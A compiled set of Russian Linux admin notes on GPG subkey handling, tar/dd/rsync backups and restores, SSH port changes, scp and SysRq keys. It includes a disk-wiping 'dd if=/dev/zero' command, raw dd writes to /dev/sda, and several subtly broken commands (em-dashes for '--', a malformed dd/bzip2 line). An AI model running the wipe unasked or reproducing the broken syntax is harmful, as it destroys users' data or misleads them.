При этом надо понимать, что у нас останется публичная часть нашего ключа в ~/.gnupg/pubring.gpg:

gpg -k

Но не будет ничего в ~/.gnupg/secring.gpg:

gpg -K

Теперь мы должны будем сделать импорт наших приватных саб-ключей, но без главного ключа:

gpg --import secret_subs.gpg

And we’re left with our “laptop keys”:

gpg -k

gpg -K

Надо понимать, что знак # рядом с sec означает что primary часть секретного ключа отсутствует в нашей связке ключей.

Теперь мы можем записать primary часть секретного ключа, например на Yubikey или другой ключ. Если у нас его нет, то просто копируем на флэшку и прячем ее в самое секретное место в мире.

gpg -a --export-secret-keys johenews > laptop_keys_secret.gpg

gpg -a --export johenews > laptop_keys_public.gpg

И теперь мы можем импортировать их на наш другой наш компьютер:

gpg --import laptop_keys_public.gpg





------------------------------------------------------------
***
Как управлять своими ключами

В этом разделе рассказывается о главных командах управления ключами.

--quick-generate-key ид. польз. [алг.[назначение [срок]]]

Эта простая команда создает обычный ключ с одним идентификатором пользователя. В отличие от --generate-key, ключ создается сразу без кучи вопросов. Если не задан параметр --yes, создание ключа будет отменено, если данный идентификатор пользователя уже присутствует в таблице ключей.

При прямом запуске из командной строки без особых параметров требуется подтверждение на запрос типа «Продолжить?». Если идентификатор пользователя уже присутствует в таблице ключей, появится второй запрос на подтверждение принудительного создания ключа.

Если задан алг. или назначение, создается только первичный ключ, а запросы не проводятся. Чтобы указать срок действия, но вместе с тем создать первичный и вторичный ключ, укажите «default» или «future-default» в качестве алг. и «default» для параметра назначение. Описание этих необязательных параметров см. в команде --quick-add-key. В параметре назначение можно задавать также «cert» для создания первичного ключа только для сертификации; по умолчанию создается ключ для подписи и сертификации.

Параметр срок можно применять для указания срока действия ключа. Поддерживается несколько форматов; обычно используются форматы ИСО ГГГГ-ММ-ДД или ГГГГММДДTччммсс. Чтобы срок истекал через n секунд, nсуток, n недель, n месяцев или n лет, задавайте «seconds=n», «nd», «nw», «nm» и «ny» соответственно. Если значение не указано или указано «-», устанавливается разумный срок по умолчанию. Значения «never» и «none» указывают, что срок действия ключа не истекает.

Если эта команда используется с --batch, а --pinentry-mode установлен в loopback и применяется один из параметров пароля (--passphrase, --passphrase-fd или passphrase-file), переданный пароль используется для нового ключа, а программа-агент его не запрашивает. Создать ключ безо всякой защиты можно с помощью --passphrase ''.

--quick-set-expire отп [срок]

Напрямую задать установить срок действия первичного ключа. Для удаления срока действия можно задать 0.

--quick-add-key отп [алг [[назначение] [срок]]]

Добавить подключ непосредственно к ключу, указанному отпечатком отп. Без необязательных аргументов добавляется подключ для шифрования. Если аргументы заданы, ключ добавляется в соответствии с ними.

В качестве алг можно задавать любой из поддерживаемых алгоритмов или названий кривых в формате, применяемом в перечислениях ключей. Если задать «default» или «-», используется алгоритм по умолчанию. Поддерживаются алгоритмы: «rsa», «dsa», «elg», «ed25519», «cv25519» и другие кривые эллиптических алгоритмов. Например, строка «rsa» добавляет ключ RSA с исходной длиной ключа; строка «rsa4096» задает длину ключа, равную 4096 бит. Строка «future-default» представляет синоним алгоритма, который, скорее всего, будет применяться в качестве основного в будущих версиях gpg.

В зависимости от параметра алг, ключ может быть предназначен либо для шифрования, либо для подписи. Если алгоритм обеспечивает подпись и шифрование и требуется такой подключ, нужно задать параметрназначение. Это либо «default» или «-» (исходные значения не меняются), либо разделенные запятой (или пробелом) ключевые слова: «sign» для подписи, «auth» для проверки подлинности, «encr» (или «encrypt») для шифрования. Допустимые комбинации зависят от алгоритма.

Параметр срок можно применять для указания срока действия ключа. Поддерживается несколько форматов; обычно используются форматы ИСО ГГГГ-ММ-ДД или ГГГГММДДTччммсс. Чтобы срок истекал через n секунд, nсуток, n недель, n месяцев или n лет, задавайте «seconds=n», «nd», «nw», «nm» и «ny» соответственно. Если значение не указано или указано «-», устанавливается разумный срок по умолчанию. Значения «never» и «none» указывают, что срок действия ключа не истекает.

--generate-key--gen-key

Создать новую пару ключей с текущими параметрами по умолчанию. Это обычная команда для создания нового ключа. В дополнение к ключу создается сертификат отзыва, который сохраняется в подкаталоге openpgp-revocs.d домашнего каталога GnuPG.

--full-genenerate-key--full-gen-key

Создать новую пару ключей, запрашивая все параметры. Это расширенная версия --generate-key.

Есть также функция, позволяющая создавать ключи в пакетном режиме (см. Автоматическое создание ключей GPG).

--generate-revokation имя--gen-revoke имя

Создать сертификат отзыва для всего ключа. Чтобы отозвать только подключ или только подпись на ключе, пользуйтесь командой --edit.

Эта команда просто создает сертификат отзыва, которым можно воспользоваться для отзыва ключа, если это когда-нибудь понадобится. Чтобы по-настоящему отозвать ключ, созданный сертификат отзыва нужно вставить в отзываемый ключ. Это делается посредством импорта сертификата отзыва с помощью команды --import. Затем отозванный ключ нужно опубликовать, лучше всего отправкой на сервер ключей (команда --send-key) и экспортом (--export) в файл, который затем высылается активным корреспондентам.

--generate-designated-revokation имя--desig-revoke имя

Создать сертификат отзывающего для ключа. Это позволяет пользователю отзывать чужой ключ (после разрешения владельца).

--edit-key

Представить меню для большей части операций, связанных с управлением ключами. Ключ указывается в командной строке.

uid n

Выделить или снять выделение с идентификатора или фотоидентификатора пользователя под номером n. * выделяет все, 0снимает выделение со всех.

key n

Выделить или снять выделение с подключа под номером n или с идентификатором ключа n. *выделяет все, 0 снимает выделение со всех.

sign

Поставить подпись на заданном ключе. Если ключ еще не подписан основным пользователем (или пользователями, заданными параметром -u), программа снова показывает сведения о ключе вместе с его отпечатком и запрашивает подтверждение подписи. Этот запрос повторяется для всех пользователей, указанных параметром -u.

lsign

То же, что «sign», но подпись помечается как неэкспортируемая, т.е. она никогда не будет учитываться другими людьми. Это можно использовать, чтобы делать ключи достоверными только в локальной среде.

nrsign

То же, что «sign», но подпись помечается как неотзываемая, т.е. ее никогда нельзя будет отозвать.

tsign

Эта подпись сочетает представления о сертификации (как обычная подпись с доверием (как команда «trust»). В целом она полезна только в отдельных сообществах и группах. Подробнее см. разделы «Trust Signature» и «Regular Expression» в RFC-4880.

Обратите внимание, что признаки «l» (локальная / неэкспортируемая), «nr» (неотзываемая) и «t» (подпись доверия) можно свободно сочетать и приставлять к «sign», чтобы получать подписи какого угодно типа.

Если указан параметр --only-sign-text-ids, любые нетекстовые идентификаторы пользователя (напр., фотоидентификаторы) для подписи выбираться не будут.

delsig

Удалить подпись. Обратите внимание, что подпись, которая была опубликована (на сервере ключей), взять назад невозможно. В этом случае лучше воспользуйтесь командой revsig.

revsig

Отозвать подпись. Для каждой подписи, созданной с помощью одного из секретных ключей, GnuPG спрашивает, создавать ли сертификат отзыва.

check

Проверить подписи на всех выделенных идентификаторах пользователя. При дополнительном параметре selfsig показываются только самоподписи.

adduid

Создать дополнительный идентификатор пользователя.

addphoto

Создать фотографический идентификатор пользователя. Будет запрошен файл JPEG, который будет вставлен в идентификатор пользователя. Обратите внимание, что очень большие файлы JPEG сделают размер ключа очень большим. Также заметьте, что некоторые программы показывают ваш JPEG без изменений (GnuPG), а некоторые промасштабируют его, чтобы разместить в диалоговом окне (PGP).

showphoto

Показать выделенный фотографический идентификатор пользователя.

deluid

Удалить идентификатор или фотоидентификатор пользователя. Обратите внимание, что пользовательский идентификатор, который был опубликован (на сервере), взять назад невозможно. Для такого случая лучше подходитrevuid.

revuid

Отозвать идентификатор или фотоидентификатор пользователя.

primary

Пометить текущий идентификатор пользователя как первичный. Со всех других идентификаторов этот признак снимается; метки времени всех задействованных самоподписей передвигаются на секунду вперед. Обратите внимание, что назначение первичным фотоидентификатора делает его первичным относительно других фотоидентификаторов, а назначение первичным обычного идентификатора делает его первичным относительно других обычных идентификаторов пользователя.

keyserver

Назначить предпочтительный сервер ключей для указанных идентификаторов пользователя. Это позволяет другим пользователям узнать, откуда вы предпочитаете распространять свой ключ. Подробнее см. --keyserver-options honor-keyserver-url. Установка значения «none» сбрасывает существующий предпочтительный сервер.

notation

Задать замечание «имя=значение» для указанных идентификаторов пользователя. Подробнее см. --cert-notation. Установка значения «none» сбрасывает все замечания, установка замечания с приписанным спереди знаком минус (-) сбрасывает это замечание, установка в виде «-имя» (без «=значение») удаляет все замечания с этим именем.

pref

Перечислить предпочтения у выделенного идентификатора пользователя. Показываются установленные предпочтения (без неявных).

showpref

Более подробное перечисление предпочтений для выделенного идентификатора пользователя. Показывает действующие предпочтения, в том числе неявные предпочтения 3DES (шифр), SHA-1 (хеш) и «не сжимать» (сжатие), когда они не включены в список предпочтений. Кроме того, показываются предпочтительный сервер ключей и замечания подписей (если есть).

setpref

Установить список предпочтений пользователя по строке для всех (или только для выделенных) идентификаторов пользователя. Вызов setpref без аргументов устанавливает исходный список (встроенный или заданный параметром --default-preference-list), а вызов setpref с аргументом «none» устанавливает пустой список предпочтений. Получить список доступных алгоритмов можно командой gpg2 --version. Обратите внимание, что хотя вы можете изменять предпочтения на атрибутном идентификаторе пользователя (называемом также фотоидентификатором), GnuPG не выбирает ключи по атрибутным пользовательским идентификаторам, так что эти предпочтения действовать не будут.

При установке предпочтений нужно перечислять алгоритмы в порядке, в котором вы хотели бы видеть их применяемыми человеком, который шифрует сообщение на ваш ключ. Если вы не укажете 3DES, он будет автоматически добавлен в конец. Обратите внимание, что есть много факторов, влияющих на выбор алгоритма (например, ваш ключ может быть не единственным получателем), так что приложение OpenPGP на другом конце, с помощью которого вам посылают сообщение, может соблюсти, а может и не соблюсти в точности заданный вами порядок для данного сообщения. Однако оно выберет только тот алгоритм, который представлен в списке предпочтений каждого из получателей. См. СОВМЕСТИМОСТЬ С ДРУГИМИ ПРОГРАММАМИ OPENPGP ниже.

addkey

Добавить подключ к данному ключу.

addcardkey

Создать подключ на карте и добавить его к этому ключу.

keytocard

Перенести выделенный секретный подключ (или первичный ключ, если ни одного подключа не выбрано) на электронную карту. Секретный ключ в таблице ключей будет заменен на заглушку, если ключ мог быть успешно перенесен на карту и вы отдали впоследствии команду save. На карту можно перенести только определенные типы ключей. Подменю позволяет выбрать, на какой карте сохранять ключ. Обратите внимание, что получить ключ с карты назад невозможно — если карта выйдет из строя, ваш секретный ключ будет утрачен, если только вы не сохранили где-нибудь резервной копии.

bkuptocard файл

Загрузить данный файл с резервной копией на карту. Этой командой можно пользоваться, чтобы заново загрузить резервную копию ключа (созданную во время инициализации карты) на новую карту. Почти во всех случаях это ключ для шифрования. Эту команду следует применять только с соответствующим открытым ключом, убедившись, что переданный в качестве аргумента файл действительно содержит резервную копию, которую нужно загрузить. Тогда нужно выбрать 2, чтобы загрузить ключ для шифрования. Сначала программа запросит фразу-пароль сохраненного ключа, затем — административный PIN электронной карты.

delkey

Удалить подключ (вторичный ключ). Обратите внимание, что подключ, который был опубликован (на сервере), взять назад невозможно. Для такого случая лучше подходит revkey. Обратите также внимание, что при этом удаляется только открытая часть ключа.

revkey

Отозвать подключ.

expire

Изменить срок действия ключа или подключа. Если выделен подключ, изменяется срок действия подключа. Если ничего не выделено, изменяется срок действия ключа.

trust

Изменить доверие владельцу ключа. База данных доверия обновляется немедленно, сохранение не требуется.

disableenable

Отключить или подключить весь ключ. Отключенный ключ обычно нельзя применять для шифрования.

addrevoker

Назначить отзывающего для ключа. Команда принимает необязательный аргумент: «sensitive» (особо важный). Если отзывающий отмечен как «sensitive», по умолчанию он экспортироваться не будет (см. параметр --export-options).

passwd

Изменить фразу-пароль секретного ключа.

toggle

Пустая команда, существует только для обратной совместимости.

clean

Ужать (удаляя все подписи, кроме самоподписи) все идентификаторы пользователя, которые больше непригодны к применению (напр., отозваны или просрочены). Затем удалить все подписи, непригодные по подсчетам доверия. А именно: удалить все подписи, которые не проходят проверку, все подписи, замененные более поздней подписью, отозванные подписи и подписи, сделанные ключами, отсутствующими в таблице ключей.

minimize

Сделать ключ как можно меньше. Удаляет все подписи со всех идентификаторов пользователя, кроме самой последней самоподписи.

cross-certify

Добавить подписи перекрестной сертификации на подписывающие подключи, у которых их в настоящий момент может не быть. Подписи перекрестной сертификации защищают от тонкой уязвимости подписывающих подключей (см. параметр --require-cross-certification). Все новые ключи создаются по умолчанию с этой подписью, так что эта команда полезна только для обновления старых ключей.

save

Сохранить все изменения в таблицах ключей и завершить работу.

quit

Завершить работу программы, не обновляя таблиц ключей.

В списке показаны ключи с их вторичными ключами и всеми идентификаторами пользователя. Первичные идентификаторы пользователя помечены точкой, выбранные идентификаторы пользователя и ключи помечены звездочкой. Значение доверия отображается вместе с первичным ключом: первое — назначенная величина доверия владельцу, второе — вычисленная величина доверия. Символы величин:

- Не назначено / еще не вычислено.e Сбой при вычислении доверия; вероятно, из-за просроченного ключа.q Для вычисления не хватает данных.n Никогда не доверять этому ключу.m Ограниченное доверие.f Полное доверие.u Абсолютное доверие.--sign-key имя

Подписать открытый ключ вашим секретным ключом. Это сокращенная версия подкоманды «sign» из --edit.

--lsign-key имя

Подписать открытый ключ вашим секретным ключом, но пометить подпись как неэкспортируемую. Это сокращенная версия подкоманды «lsign» из --edit.

--quick-sign-key отп [имена]--quick-lsign-key отп [имена]

Непосредственно подписать ключ по фразе-паролю без всякого дальнейшего взаимодействия с пользователем. Аргумент отп должен быть проверенным первичным отпечатком ключа из локальной таблицы ключей. Если имена не заданы, подписываются все полезные идентификаторы пользователя; еслиимена даны, подписываются только соответствующие им полезные идентификаторы. По умолчанию или если перед именем стоит «*», проводится поис подстроки без учета регистра символов. Если перед именем стоит «=», ищется полное соответствие с учетом регистра.

Команда --quick-lsign-key помечает подписи как неэкспортируемые. Если такая неэкспортируемая подпись уже существует, --quick-sign-key обращает ее в экспортируемую.

Команда делает разумные предположения, поэтому не предоставляет всей гибкости подкоманды «sign» --edit-key. Команда предназначена для автоматической подписи ключей по списку проверенных отпечатков.

--quick-add-uid идентификатор пользователяновый идентификатор пользователя

Эта команда добавляет к существующему ключу новый идентификатор пользователя. В отличие от диалоговой подкоманды adduid --edit-key, новый идентификатор пользователядобавляется буквально, удаляются только пробелы из начала и конца строки, предполагается кодировка UTF-8, форма идентификатора не проверяется.

--quick-revoke-uid идентификатор пользователя отзываемый идентификатор пользователя

Эта команда отзывает идентификатор пользователя на существующем ключе с причиной отзыва «Идентификатор больше не действителен». Ее нельзя использовать для отзыва последнего идентификатора пользователя (какой-то идентификатор должен оставаться неотозванным). Если вы хотите указать другую причину отзыва или предоставить дополнительный текст отзыва, нужно воспользоваться интерактивной подкомандой revuidкоманды --edit-key.

--quick-set-primary-uid идентификатор пользователя новый идентификатор

Команда устанавливает или изменяет признак первичного идентификатора пользователя на существующем ключе. Первый аргумент указывает ключ, второй — идентификатор, который будет помечен как первичный. Признак первичного идентификатора удаляется со всех остальных идентификаторов, а метки времени всех самоподписей, которых это касается, сдвигаются на секунду вперед.

--change-passphase идентификатор пользователя--passwd идентификатор пользователя

Поменять фразу-пароль секретного ключа, принадлежащего сертификату, указанному как идентификатор пользователя. Это сокращение подкоманды passwd --edit-key.


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Бэкап системы-
Загружаешься с арчевского установочного диска монтируешьнужный раздел (в твоем случае это наверно 1 раздел ) в /mmt например. Монтируешь еще один раздел (туда будешь архив ложить,) например /media. Потом tar -cvjpf /media/path…tar.bz2 /mnt. Есть еще нюансы в этом методе для облегчения но писать лениво. Можно еще создать полный образ раздела. Если два поста сразу я не виноват,мини опера бывает так делает,так что заранее извиняюсь. 









вот скрипт

#!/bin/sh
D=`date +%F`
if [ ! -d "/home/.backup" ]
        then
                mkdir '/home/.backup/'
        fi
tar cjpvf  "/home/.backup/backup-${D}" / -X /etc/backup.conf


файл /etc/backup.conf - всё что бекапить не надо
/media/*
/dev/*
/mnt/*
/media/*
/tmp/*
/proc/*
/sys/*
/var/backup/*
/usr/src/*
###############
запускаем скрипт - пока бекапиться читаем man tar - радуемся готовому бекапу ))) 







copy_ext.sh

DEV=$1
if [ -z $DEV ] ; then
  echo "Create gz-compressed copy of partition. Parameters: devname [tgzname]"
  echo "By default tgzname is devname-0.iz"
  echo "Example: \"copy_part sda5\" or \"copy_part sda5 ubuntu-1.iz\" "
  exit 1
fi
umount /dev/$DEV
TOTAL=`lsblk -bo SIZE /dev/$DEV | tail -n 1`

FNAME=$2
if [ -z $FNAME ] ; then
  FNAME=$DEV-0.iz
fi

echo /dev/$DEV, total $TOTAL, copy to $FNAME
read -p "Press [Enter] key to start backup..."

echo
echo Copy...
e2image -ra /dev/$DEV - | pv -s $TOTAL | gzip -c -4 > $FNAME


rest_ext.sh

DEV=$1

umount /dev/$DEV

FNAME=$2

TO_COPY=`stat -c %s $FNAME`
echo "To copy compressed (bytes):" $TO_COPY
echo "from file $2 to device /dev/$DEV"
read -p "Press [Enter] key to start restore..."

cat $FNAME | pv -s $TO_COPY | gzip -d > /dev/$DEV





------------------------------------


1. Создание бэкапа

Грузимся с live-флэшки, у меня это debian-live-7.8.0-amd64-standard.

Переключаемся на root:

sudo su


Монтируем раздел, который будем архивировать, у меня это sda1, чтобы случайно не наломать дров, монтируем только для чтения. Посмотреть все свои разделы можно при помощи команд ls /dev | grep sd или df -l

mount -o ro /dev/sda1 /mnt 


Наша флэшка уже примонтирована, но в режиме только чтения, нужно перемонтировать для чтения-записи, чтобы писать туда бэкап.

mount -o remount,rw /dev/sdb1 /lib/live/mount/medium


Все готово для создания архива

tar -cvzpf /lib/live/mount/medium/backupYYYYMMDD.tgz --exclude=/mnt/var/spool/asterisk/monitor --exclude=/mnt/var/spool/asterisk/backup /mnt/


Здесь у нас параметры: c — создать архив, v — выводить информацию о процессе, z — использовать сжатие gzip, p — сохраняем данные о владельцах и правах доступа, f — пишем архив в файл, путь к файлу, --exclude — исключаем из архива каталог (я исключил каталоги с записями разговоров и каталог с бэкапами FreePBX), /mnt/ — каталог, который архивируем.

Ждем… у меня вся подготовка и создание архива заняли 10 минут. Будь флэшка быстрее, уложился бы в 7-8 минут.

Отмонтируем диск:

umount /mnt


… и перезагружаемся.

reboot


Складываем архив в надежное место за пределами офиса.

Восстановление бэкапа на другом железе

2. Размечаем диск, создаем файловую систему

Грузимся с live-флэшки, у меня все та же debian-live-7.8.0.

Переключаемся на root:

sudo su


Размечаем диск. Мне понравилась утилита с псевдографическим интерфейсом cfdisk. Там все просто и понятно.

cfdisk


Удаляем все имеющиеся разделы. Я создал два новых раздела, один на 490 Gb под / (sda1) и 10 Gb под swap (sda2) в конце диска, т.к. он практически не будет задействован. Проверим типы разделов. Который под систему должен иметь тип 83 Linux, второй — 82 Linux swap / Solaris. Помечаем системный раздел загрузочным (bootable), сохраняем изменения и выходим.

Cоздаем файловую систему на первом разделе.

mkfs.ext4 /dev/sda1


3. Распаковываем архив.

Монтируем отформатированный раздел

mount /dev/sda1 /mnt


Распаковываем архив прямо с флэшки

tar --same-owner -xvpf /lib/live/mount/medium/backupYYYYMMDD.tgz -C /mnt/


Параметр --same-owner — сохраняет владельцев у распаковываемых файлов, x — извлекаем из архива, v — выводить информацию о процессе, p — сохраняем права доступа, f — указываем файл, который распаковываем, C — распаковываем в категорию.

4. Создаем MBR на новом диске.

Чтобы корректно создать загрузочную запись, монтируем рабочие каталоги к нашему будущему root-каталогу, у меня это /mnt. Каталоги /dev и /proc сейчас используются live-системой, используем параметр bind, чтобы они были доступны сразу в двух местах:

mount --bind /dev /mnt/dev
mount --bind /proc /mnt/proc


Переключаемся на новую систему используя chroot:

chroot /mnt


Делаем swap-раздел для новой системы:

mkswap /dev/sda2 


Подключаем его же:

swapon /dev/sda2


Чтобы grub работал, нужно указать ему правильные UUID разделов в fstab, сейчас там прописаны разделы предыдущей системы:

nano /etc/fstab


Открываем второй терминал (Alt+F2) под root:

sudo su


Вызываем:

blkid


И видим текущие UUID разделов.

Вручную переписываем их в fstab переключаясь между Alt+F1 и Alt+F2. Да, муторно, но попытки копировать занимали у меня больше времени, чем переписывание. Сохраняем fstab.

Устанавливаем grub2. У меня один физический диск, поэтому ставим его на sda:

grub-install /dev/sda


На чистый диск должно встать без ошибок. Обновляем информацию из fstab:

update-grub


Возвращаемся в Live-систему:

exit


Размонтируем все каталоги:

umount /mnt/dev
umount /mnt/proc
umount /mnt


Если вылазят процессы, которые используют эти каталоги, убиваем их используя fuser.

Все, поехали. Грузимся с жесткого диска:

reboot


Здесь статья должна была закончиться, но у меня возникли проблемы с подключением к интернету. Сервер видит сеть, видит компьютеры в ней, но в интернет не ходит… а это как бы важно для телефонии.

5. Тестирование и устранение неполадок.

ifconfig -a


Показывет интерфейсы eth1 и lo, гугление сказало, что gateway можно прописать только подключению eth0, остальные рассчитаны только на работу внутри сети.

Похоже, отсутствие eth0 вызвано способом переноса системы. Находим файл, который отвечает за нумерацию интерфейсов, смотрим туда:

nano /etc/udev/rules.d/70-persistent-net.rules


Действительно, там два активных интерфейса, определенных MAC’ами. Комментируем первый, второму прописываем eth0.

Перезапуск /etс/init.d/networking не помог, поэтому перезагружаемся:

reboot

--------



Непонятно почему топикстартер не использует мощнейший мануал на wiki.archlinux.org?? ))
Один из вариантом забекапить Х систему является пакет rsync: https://wiki.archlinux.org/index.php/Full_system_b...

Сама команда бэкапа выглядит так:
# rsync -aAXv --exclude={"/dev/*","/proc/*","/sys/*","/tmp/*","/run/*","/mnt/*","/media/*","/lost+found"} / /path/to/backup/folder

Если бэкап будешь делать в раздел HOME, не забудь добавить в исключение (exclude), а то зациклит и забьешь весь HOME дублем бэкапа ;)

Этим же способом можно бэкапить любую OS Linux, пакет присутствует практически во всех сборках и является бесплатным в отличие от Acronis.



___________________________________________________________________________________________________________________________________________________________________________________________________________________

Полный бэкап системы-

dd if=/dev/sda of=/mnt/backup/sda.img bs=8M conv=sync,noerror

if=/dev/sda - копируем весь жесткий диск sda;

of=/mnt/backup/sda.img - копируем в /mnt/backup/sda.img;

bs=8M - задаем размер кэша жесткого диска для ускорения процедуры копирования (иначе данные будут сбрасываться малыми порциями по 512 байт);

conv=sync,noerror - указываем dd на необходимость копирования по типу бит-в-бит с игнорированием ошибок чтения.


dd if=/dev/sda bs=8M conv=sync,noerror | gzip -c > /mnt/backup/sda.img

gunzip -c /mnt/backup/sda.img | dd of=/dev/sda conv=sync,noerror bs=8M



sudo dd if=/dev/sda of=mbr.img bs=1b count=1

 dd if =/dev/sda2 | bzip2 disk.img.bz2


sudo dd if=/dev/sr0 of=~/CD.iso bs=2048 conv=noerror 

dd if=/dev/sda of=~/disk.img

dd of=~/disk.img if=/dev/sda


sudo dd if=/dev/random of=file.img bs=1M count=512 



sudo dd if=/dev/zero of=/dev/sdb
-стереть диск




-----------------

Если нет желания пользоваться mkisofs (кстати, ￼mironov_ivan, посоветовал неправильный ключ: -J не нужен, нужен -R, ибо joilet-расширение для мастдая) можно так:

1. Создаем командой dd файл с размером, равным размеру данных, влезающих на dvd:

dd if=/dev/zero of=image.file bs=1024 count=4590208 

2. Создаем на нем ext2:

sudo mkfs.ext2 image.file 

3. В fstab прописываем:

/path/to/image.file	/4write@DVD	ext2	user,loop 0 0 /dev/sr0		/media/DVD.ext2	ext2	noauto,user 0 0 

Первая строчка монтирует наш образ, вторая позволяет монтировать записанные диски.

3. Монтируем образ и записываем в него свои данные, как только место на образе кончится, отмонтируем и записываем на болванку:

cdrecord image.file 

4. Монтируем образ и удаляем содержимое для подготовки к записи следующей порции файлов.

Работает на ура. Из плюсов такого способа: можно постепенно подкидывать файлы на образ и записывать, когда он полностью забьется; 99% гарантии, что в мастдае такой диск никто не откроет. Ну, а если перед записью выставить права 0 на корень образа, то его можно будет прочитать только скопировав на диск, смонтировав и изменив права - т.е. так ваши данные будут в довольно надежной сохранности. При желании можно еще и зашифровать ФС на образе.




___________________________________________________________________________________________________________________________________________________________________________________________________________________


Копирования (синхронизация) данных с удаленного сервера на сетевое хранилище (NAS)-

Необходимо было разово выполнить процедуру резервного копирования данных с удаленного сервера на сетевое хранилище в локальной сети

Исходные данные:

ip-адрес сетевого хранилища: 192.168.0.17ip-адрес удаленного сервера: 8.8.8.8

Подключаемся по ssh к сетевому хранилищу

ssh admin@192.168.0.17

Оттуда запускаем команду синхронизации

rsync -rltvzu —progress root@8.8.8.8:/home/data/ /volume1/Backup/data

-r, рекурсивный режим (копирование всех подпапок и файлов в них)-l, копировать символические ссылки «как есть», то есть rsync не будет следовать по ним, обращаясь к файлам-t, обновлять время модификации файла на приёмной стороне-v, подробные вывод операций-z, компрессия данных при передаче-u, режим обновления, пропускаются файлы на получателе, имеющие более позднюю дату модификации, чем в источнике/home/data/ - соержимое каталога, который мы копируем (!!! обратный слэш в конце)/volume1/Backup/data - каталог, куда будут скопированны данные

В команде rsync отсутствует ключ -a, так как в него входят другие ключи, из-за которых синхронизация не выполнялась

Основные ключи команды

-a, режим архивирования, включает ключи -rlptgoD;-r, каталоги копируются рекурсивно;-l, копировать символические ссылки «как есть», то есть rsync не будет следовать по ним, обращаясь к файлам;-p, сохранение прав доступа к файлам;-t, сохранение времени модификации файлов;-g, -o, сохранение владельца и группы файла;-D, сохранение файлов устройств и специальных файлов;-u, режим обновления, пропускаются файлы на получателе, имеющие более позднюю дату модификации, чем в источнике;-v, выводит имена копируемых файлов;-q, не выводит сообщения об ошибках;-z, включение режим сжатия😜, отображение прогресса при копировании;-с, проверка файлов по контрольной сумме, а по размеру и дате модификации. Дополнительная нагрузка на процессор, сильно увеличивает время синхронизации;--ignore-errors, продолжение копирования и удаления даже после появления ошибок;--max-delete, максимальное число удаляемых за один раз файлов и каталогов;--files-from=FILE, задается список файлов и директорий для копирования в файле;-e ssh, использование при копировании ssh;--bwlimit=KBPS, ограничение скорости копирования.

https://itdraft.ru/2018/08/29/kopirovanija-sinhroniza..



-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

SHH-


Меняем стандартный SSH порт в Centos 7

Меняем SSH порт

SSH — сетевой протокол прикладного уровня, позволяющий производить удалённое управление операционной системой и туннелирование TCP-соединений.

Проверяем, что разрешено на сервере в фаерволле:

[root@localhost]# firewall-cmd —permanent —list-all
public (default)
interfaces:
sources:
services: ssh dhcpv6-client
masquerade: no
forward-ports:
icmp-blocks:
rich rules:

Открываем порт, на который мы хотим повесить OpenSSH

[root@localhost]# firewall-cmd —permanent —zone=public —add-port=6622/tcp
[root@localhost]# firewall-cmd —reload

Проверяем

[root@localhost]# firewall-cmd —zone=public —list-ports
6622/tcp

Редактируем конфигурационный файл sshd_config

[root@localhost]# nano /etc/ssh/sshd_config
...
Port 6622
...

Тем самым мы поменяли стандартный порт 22 на 6622.

На данном этапе НЕ СЛЕДУЕТ перезапускать службу SSH

Если вы не отключали SELinux, надо внести некоторые изменения

[root@localhost]# yum install policycoreutils-python
[root@localhost]# semanage port -a -t ssh_port_t -p tcp 6622

Вот теперь можно перезагружать службу sshd

[root@localhost]# systemctl restart sshd

Проверяем подключение по ssh на новом порту 6622.Если все ок, закрываем доступ к стандартному порту

[root@localhost]# firewall-cmd —permanent —zone=public —remove-service=ssh
[root@localhost]# firewall-cmd —reload

http://bit.ly/2JgSq1n




____________________


Копировать файлы на удаленный сервер по SSH

Копирование по SSH

SCP (Secure Copy Protocol) - команда в Linux для защищенного копирования файлов или папок на удаленный компьютер (сервер) или с него, используя для этого протокол SSH (Secure Shell). SCP является составной частью пакета OpenSSH. Благодаря использованию ssh, SCP является отличной заменой для небезопасного протокола FTP, которой широко используется в Интернете.

Для копирования файлов с удаленного сервера, либо на удаленный сервер, либо между удаленными серверами есть замечательная утилита SCP

Несколько примеров использования команды SCP

Скачиваем файл на локальную машину:

[root@localhost]# scp root@192.168.10.12:/home/backup/archive.tar.gz /media

С помощью этой команды мы скачиваем файл /home/backup/archive.tar.gz с удаленного сервера 192.168.10.12 в наш локальный каталог /media

Загружаем файл на удаленный сервер:

[root@localhost]# scp /media/archive.tar.gz root@192.168.10.12:/home/backup

С помощью этой команды мы загружаем файл /media/archive.tar.gz с локального ПК на удаленный сервер 192.168.10.12 в каталог /home/backup

Копируем каталог "log" с локального хоста в директорию "log" на удаленном хосте:

[root@localhost]# scp -r /home/log root@192.168.10.12:/opt/remote/log

Копирование между серверами:

[root@localhost]# scp -r root@server1.local:/home/dir/ root@server2.local:/home/dir/

Если SSH запущен на другом порту, можно указать это с помощью команды -P ("P" большая, и указывается перед хостом):

[root@localhost]# scp -P 9999 file.zip root@192.168.10.12:~/

Копируем файлы «test1.txt» и «test2.txt» с локального компьютера в домашний каталог на удаленном сервере.

[root@localhost]# scp test1.txt test2.txt root@192.168.10.12:~

Копируем файл «test.txt» локального компьютера в домашний каталог на удаленном сервере. Для увеличиваем скорости работы SCP изменим алгоритм шифрования с AES-128 (по умолчанию) на Blowfish:

[root@localhost]# scp -c blowfish test.txt root@192.168.10.12:~

Ограничиваем ширину канала используемого SCP до 300 Kbit/s:

[root@localhost]# scp -l 300 test.txt root@192.168.10.12:~

Дополнительные флаги, используемые SCP:

-r - рекурсивное копирование (для директорий) -C - использовать сжатие при передачи-P - порт ssh-p - сохранить информацию о времени создания, модификации файла

http://bit.ly/30kP3Nn





-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Список команд SysRq в Linux



Одновременное нажатие клавиш Alt + SysRq + (буква в одинарных кавычках)
Alt + SysRq + H Help — выводит все доступные возможности SysRq, выделяя большой буквой клавишу действия;
Alt + SysRq + 0-9 loglevel0-9 — позволяет менять уровень подробности вывода от 0 (только критические сообщения) до 8 (самый подробный режим);
Alt + SysRq + B reBoot — выполняет немедленную перезагрузку системы аналогично кнопке RESET (без синхронизации и размонтирования файловых систем);
Alt + SysRq + C Crashdump — выполняет директиву kexec для перезагрузки чтобы получить сведения об ошибках;
Alt + SysRq + D holDs — показывает все блокировки, которые держат устройства или файлы;
Alt + SysRq + O powerOff — корректно выключает систему (если настроено и поддерживается, обычно это прямая команда отключения);
Alt + SysRq + S Sync — пытается синхронизировать все примонтированные файловые системы, при этом пишет в консоли «Emergency Sync». При успешно завершении выводится «Emergency Sync Complete»;
